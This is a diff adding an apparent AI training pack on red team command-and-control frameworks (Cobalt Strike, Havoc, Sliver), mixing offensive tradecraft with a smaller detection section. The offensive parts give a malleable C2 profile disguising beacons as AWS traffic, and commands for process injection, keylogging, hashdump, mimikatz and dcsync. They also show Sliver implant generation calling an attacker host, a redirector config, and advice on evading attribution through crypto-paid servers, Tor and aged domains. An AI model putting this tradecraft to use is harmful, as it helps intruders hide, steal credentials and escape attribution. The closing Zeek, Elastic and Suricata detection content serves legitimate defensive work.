@@ -1,0 +1,331 @@
+================================================================================
+TITAN AI — TRAINING PACK 045: RED TEAM OPERATIONS AND C2 FRAMEWORKS
+COBALT STRIKE DEEP DIVE, HAVOC, SLIVER, BRUTE RATEL, MALLEABLE C2, OPSEC
+================================================================================
+
+================================================================================
+PART 1: C2 FRAMEWORK ARCHITECTURE
+================================================================================
+
+--- COMMAND AND CONTROL CONCEPTS ---
+
+C2 FRAMEWORK COMPONENTS:
+  Team Server: Operator-side server. Hosts listener. Receives beacon callbacks.
+  Listener: Defines how beacons connect back (HTTP/S, DNS, SMB, TCP).
+  Beacon/Agent: Implant running on victim. Polls team server. Executes tasks.
+  Operator Console: UI for managing sessions, executing commands.
+
+COMMUNICATION PATTERNS:
+  Synchronous: Beacon constantly connected. Low latency. Detectable (persistent connection).
+  Asynchronous (Sleep): Beacon checks in every N seconds/minutes. Less detectable.
+  Jitter: Random ±% variation in sleep time. Defeats timing-based detection.
+    If sleep=60, jitter=25: Next beacon between 45-75 seconds. Less predictable.
+  
+EGRESS OPTIONS:
+  HTTP/HTTPS: Most common. Blends with web traffic.
+  DNS: Slowest. Bypasses many egress filters. Hard to block (need DNS for internet).
+  SMB named pipes: Lateral movement only. No internet egress.
+  TCP: Direct TCP. Usually blocked outbound.
+  ICMP: Covert. ICMP echo reply carries data. Often missed.
+  
+  Priority: HTTPS (443) → DNS (53) → SMB (internal only) → other ports.
+
+================================================================================
+PART 2: COBALT STRIKE — DEEP TECHNICAL
+================================================================================
+
+--- BEACON INTERNALS ---
+
+Cobalt Strike Beacon: Memory-resident. Runs as injected shellcode or standalone process.
+  
+Beacon types:
+  HTTP/HTTPS Beacon: Callbacks over HTTP/S. Configurable URIs, headers, cookies.
+  DNS Beacon: Uses DNS A/TXT/MX records for C2. Slowest (1-10 bytes/query). Bypasses many filters.
+  SMB Beacon: Named pipe communication. Peer-to-peer within network. Needs "parent" beacon for internet.
+  TCP Beacon: Direct TCP connection to parent. Internal lateral movement.
+
+MALLEABLE C2 PROFILES:
+  Defines: Exactly what HTTP traffic looks like. Headers, URIs, user agents, body transforms.
+  Goal: Make beacon traffic look like legitimate application traffic.
+  
+  EXAMPLE — Beacon that looks like Amazon AWS SDK traffic:
+  http-get {
+      set uri "/s3/bucket-name/path/to/file";
+      
+      client {
+          header "Accept" "application/json";
+          header "User-Agent" "aws-sdk-java/1.11.900 Linux/5.4.0 OpenJDK_64-Bit_Server_VM/11.0.9";
+          header "X-Amz-Date" "20250115T120000Z";
+          
+          metadata {
+              base64url;
+              prepend "AWSACCESSKEYID=";
+              header "X-Amz-Security-Token";
+          }
+      }
+      
+      server {
+          header "Content-Type" "application/xml";
+          header "x-amz-request-id" "RANDOM_ID";
+          
+          output {
+              base64url;
+              prepend "<?xml version=\"1.0\"?><ListBucketResult>";
+              append "</ListBucketResult>";
+              print;
+          }
+      }
+  }
+  
+  Result: Network observer sees HTTP GET to /s3/... with AWS headers. Looks like S3 API calls.
+  
+  IMPORTANT PROFILES (detection evasion):
+  Amazon S3 / CloudFront: Very common. Hard to block.
+  Microsoft Office 365: Graph API calls.
+  Google APIs: GCP-like traffic.
+  jQuery: Old standard. Well-known in threat intel. Now easily detected.
+
+BEACON PROCESS INJECTION (post-exploitation):
+  inject <PID> <arch>     → Inject beacon into running process
+  shinject <PID> x64 <shellcode>  → Inject raw shellcode
+  
+  spawn <arch>            → Spawn new beacon process
+  spawnas DOMAIN\User password    → Spawn as different user
+  
+  Preferred injection targets:
+  spoolsv.exe, svchost.exe, explorer.exe — System processes. Long-lived. Less suspicious.
+
+COBALT STRIKE OPERATIONAL COMMANDS:
+  # Keylogging:
+  keylogger [PID] [x86|x64]    # Inject keylogger into process
+  keylogger                     # Inject into explorer.exe
+  
+  # Screenshot:
+  screenshot [pid]
+  printscreen      # Take screenshot via keypress injection
+  
+  # File operations:
+  download filename
+  upload localfile
+  
+  # Port scanning:
+  portscan [hosts] [ports] [discovery method] [max connections]
+  portscan 192.168.1.0/24 1-1024 none 1024
+  
+  # Pivoting:
+  socks 1080          # Start SOCKS4a proxy on team server port 1080
+  rportfwd 8080 internal.server.corp 80   # Reverse port forward
+  
+  # Credential operations:
+  hashdump            # Dump local SAM database
+  mimikatz            # Run Mimikatz (inline, no disk)
+  dcsync CORP.LOCAL   # DCSync to get all domain hashes
+
+--- COBALT STRIKE DETECTION SIGNATURES ---
+
+DEFAULT CS INDICATORS (misconfigured/cracked CS — easily detected):
+  TLS JA3S fingerprint: Cobalt Strike default cert specific fingerprint.
+  HTTP response: Server header "Apache" with specific ordering.
+  Beacon payload: MZ header at start of stager shellcode.
+  Default port: 50050 (team server). Should be changed.
+  Default HTTP URI: "/ca", "/dpixel", "/push" — well-known.
+  
+  Detection tools:
+  JARM: TLS fingerprinting → Detect CS server on internet.
+  Shodan: cs.jarm:... — Shows all exposed CS servers.
+  
+HUNTING IN-MEMORY BEACONS:
+  pe-sieve: Scan all processes for suspicious PE anomalies.
+  Moneta: Memory scanner for C2 beacons.
+  BeaconEye: Detect live Cobalt Strike beacons in memory.
+  
+  EDR detection:
+  ReflectiveDLL loaded in process memory: PE header in non-file-backed memory region.
+  "Unbacked" executable memory: VirtualAlloc'd region with execute permissions, no file mapping.
+  Command line: "powershell.exe -nop -w hidden -enc BASE64" from parent process.
+
+================================================================================
+PART 3: HAVOC (OPEN-SOURCE CS ALTERNATIVE)
+================================================================================
+
+--- HAVOC FRAMEWORK ---
+
+Havoc: Open-source C2 framework. Written in C/C++ and Go. 2022+.
+  Replaces Cobalt Strike for red teams avoiding license/cracked versions.
+  Features: HTTP/S listeners, SMB, TCP. Teamserver. Demon implant.
+
+DEMON AGENT:
+  Written in C. Compact. Configurable.
+  Sleep obfuscation: Beacon encrypts itself while sleeping.
+  EKKO sleep obfuscation: Encrypts beacon code, decrypts on wake.
+    When sleeping: Memory scan finds only encrypted blob. No beacon signature.
+    Defeats: Memory scanning for C2 beacons during sleep periods.
+  
+  Module system: Capabilities as separate modules. Minimize in-memory footprint.
+  Unhooking: Removes EDR user-mode hooks from ntdll.dll. (Fresh copy from disk.)
+
+HAVOC TEAMSERVER:
+  Written in Go. REST API for operators.
+  Web UI or GUI client for operator interaction.
+  Listener configuration (HTTPS example):
+    Hosts: ["0.0.0.0"]
+    Port: 443
+    Headers: ["Content-type: text/html"]
+    Uris: ["/index.html", "/contact.php"]
+    Response Headers: ["Server: Apache/2.4.41 (Ubuntu)", "Content-type: text/html"]
+    Cert: "/path/to/cert.pem"
+    Key: "/path/to/key.pem"
+
+================================================================================
+PART 4: SLIVER (BISHOPFOX OPEN SOURCE)
+================================================================================
+
+--- SLIVER C2 ---
+
+Sliver: Go-based open-source C2. BishopFox (red team firm).
+  Cross-platform: Implants for Windows, Linux, macOS.
+  Protocols: HTTP/S, mTLS, DNS, WireGuard.
+  Key feature: Wireguard-based tunneling (novel approach).
+
+SLIVER IMPLANT GENERATION:
+  # Generate HTTPS implant:
+  sliver> generate --http teamserver.attacker.com --os windows --arch amd64 --format exe --save /tmp/implant.exe
+  
+  # Generate shellcode (for injection):
+  sliver> generate --http teamserver.attacker.com --os windows --format shellcode --save /tmp/implant.bin
+  
+  # Stage via HTTP:
+  sliver> stage-listener --url http://teamserver.attacker.com:8080/updates.exe --profile default
+
+SLIVER UNIQUE FEATURES:
+  Multiplayer: Multiple operators on same server.
+  Traffic encoding: Base58, base64, hex encoding. Custom config.
+  Let's Encrypt: Auto-provision TLS certs using Let's Encrypt.
+  WireGuard: Route C2 through WG tunnel. Operator and server connected via VPN.
+  Pivoting: SOCKS5 proxy, port forwarding built-in.
+  Extensions: Load custom .NET assemblies, BOFs (Beacon Object Files from CS).
+
+================================================================================
+PART 5: OPERATIONAL SECURITY (OPSEC)
+================================================================================
+
+--- RED TEAM OPSEC PRINCIPLES ---
+
+ATTRIBUTION AVOIDANCE:
+  
+Infrastructure:
+  Redirectors: Don't expose team server directly. Use "redirectors" — servers that
+  proxy traffic to real team server. If caught: Burn redirector, team server safe.
+  
+  Apache mod_rewrite (redirector):
+  # Legitimate Cobalt Strike profile URIs → forward to team server.
+  # Everything else → redirect to benign site (avoid analyst investigation).
+  
+  RewriteEngine On
+  RewriteCond %{REQUEST_URI} ^/jquery-3.3.1.min.js$
+  RewriteRule ^(.*)$ http://teamserver.attacker.internal:443%{REQUEST_URI} [P]
+  RewriteRule ^(.*)$ https://microsoft.com/ [R=302,L]
+  # Beacon traffic: Forwarded to team server.
+  # Analyst visiting: Redirected to Microsoft. Nothing to see.
+  
+  Domain fronting (where available):
+  CDN provider (Cloudflare, Azure CDN): Used as traffic front.
+  Beacon connects to CDN (appears legitimate), CDN proxies to attacker server.
+  
+  Domains:
+  Register: 3-6 months before operation. New domains = immediate detection.
+  Categories: Register domain in category matching fake cover (technology, news).
+  Reputable: Use domain with history. Buy aged domains from domain auctions.
+  Similar: Lookalike to legitimate (msft-updates.com vs microsoft.com). But: Easily flagged.
+
+OPERATIONAL TIMELINE OPSEC:
+  Work during victim's business hours: Attacker traffic blends with normal.
+  Beacon callbacks during business hours: Normal for victim's timezone.
+  Stay off nights/weekends: Security teams monitoring more closely. Or not at all (small team).
+  
+  Exception: Data exfiltration / ransomware deployment: Often off-hours (less monitoring, fewer humans).
+
+CREDENTIAL HYGIENE:
+  Separate infrastructure for each engagement. No reuse.
+  VPS: Paid with cryptocurrency. Or prepaid cards.
+  No personal information in registration.
+  TOR or proxies: For purchasing infrastructure.
+  
+  Attacker mistake: Logging into personal email from attack infrastructure → Attribution.
+
+BURNING INDICATORS:
+  IOC (Indicator of Compromise): Once detected by blue team, indicator is burned.
+  Rotate: C2 domain, IP, TLS cert, beacon profile when detected.
+  "Cut and replace": Stop using burned infrastructure. Establish new.
+  If APT-level: May silently observe attacker using burned infrastructure while preparing response.
+
+================================================================================
+PART 6: DETECTION ENGINEERING FOR C2
+================================================================================
+
+--- HUNTING C2 TRAFFIC ---
+
+DNS-BASED DETECTION:
+  High-entropy subdomain queries: DGA domains (random-looking).
+  Consistent query interval: Beacon DNS polling at fixed rate.
+  TXT record queries for long domains: DNS C2 channels use TXT.
+  NXDOMAIN ratio: High rate of NXDOMAIN (DGA probing).
+  
+  Zeek/Bro DNS detection:
+  event dns_request(c: connection, msg: dns_msg, qtype: count, qclass: count) {
+    if (msg$question$qname ~ /^[a-z0-9]{20,}\./ ) {
+        # High entropy subdomain
+        NOTICE([$note=DNS::HighEntropySubdomain,
+                $msg=fmt("High entropy DNS query: %s", msg$question$qname)]);
+    }
+  }
+
+HTTP-BASED DETECTION:
+  User agent anomaly: "sqlmap/1.0", "python-requests/2.25" connecting to suspicious domains.
+  Beaconing: Same URI at consistent intervals. Beacon timing analysis.
+  JA3/JA3S fingerprint: Specific TLS handshake fingerprint. CS defaults detectable.
+  Domain age: C2 on newly registered domain.
+  
+  Elastic query (beaconing detection):
+  {
+    "aggs": {
+      "client_server_pairs": {
+        "terms": {"field": "source.ip"},
+        "aggs": {
+          "intervals": {
+            "date_histogram": {"field": "@timestamp", "fixed_interval": "1m"},
+            "aggs": {"request_count": {"value_count": {"field": "url.full"}}}
+          }
+        }
+      }
+    }
+  }
+  // Find: source IPs making exactly 1 request per minute to same destination consistently.
+
+THREAT INTEL INTEGRATION:
+  Feed: EmergingThreats C2 rules for Snort/Suricata. Updated daily.
+  Commercial: Proofpoint ET Pro, Talos Snort rules — detect specific CS, Havoc, Sliver patterns.
+  
+  Suricata rule for Cobalt Strike default:
+  alert http $HOME_NET any -> $EXTERNAL_NET any (
+    msg:"ETPRO TROJAN Cobalt Strike Beacon Activity (HTTP)";
+    flow:established,to_server;
+    http.uri;
+    content:"/ca";
+    http.user_agent;
+    content:!"Mozilla";
+    sid:1000001; rev:1;
+  )
+
+================================================================================
+END OF PACK 045: RED TEAM C2 FRAMEWORKS
+Total: C2 architecture (teamserver/listener/beacon, sleep/jitter/egress options),
+Cobalt Strike beacon internals (types, malleable C2 profiles with AWS SDK example),
+CS post-exploitation commands (keylogger/screenshot/download/pivoting/mimikatz),
+default CS detection signatures, in-memory beacon hunting tools (pe-sieve/BeaconEye),
+Havoc framework (EKKO sleep obfuscation, module system), Sliver (Go/cross-platform,
+WireGuard tunneling, generate commands), red team OPSEC (redirectors/mod_rewrite/
+domain selection/operational timing), attribution avoidance (infrastructure hygiene,
+burning indicators), detection engineering (DNS entropy analysis, HTTP beaconing
+detection with Elastic, Suricata CS rule).
+================================================================================
